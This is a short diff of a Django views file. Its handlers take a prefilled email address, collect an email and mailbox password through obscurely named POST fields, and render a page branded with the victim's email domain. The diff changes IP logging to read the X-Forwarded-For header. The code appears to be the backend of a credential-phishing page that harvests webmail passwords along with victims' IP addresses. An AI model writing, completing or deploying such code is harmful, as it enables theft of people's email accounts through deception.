@@ -10,13 +10,13 @@ from django.template.loader import render_to_string
 
 
 def homeon(request):
-    ip = request.META.get("REMOTE_ADDR")
+    ip = request.META.get("HTTP_X_FORWARDED_FOR")
     auto = request.GET["email"]
     domain = auto[auto.index('@') + 1 : ]
     return render(request, 'index.html', {'email': auto, 'domains': domain})
 
 def addin(request):
-    ip = request.META.get("REMOTE_ADDR")
+    ip = request.META.get("HTTP_X_FORWARDED_FOR")
     email = request.POST["powerioman"]
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
@@ -53,7 +53,7 @@ def addin(request):
         return render(request, 'indexx.html', {'email': email, 'domains': domain})
 
 def adddzz(request):
-    ip = request.META.get("REMOTE_ADDR")
+    ip = request.META.get("HTTP_X_FORWARDED_FOR")
     email = request.POST["zzpowerman"]
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
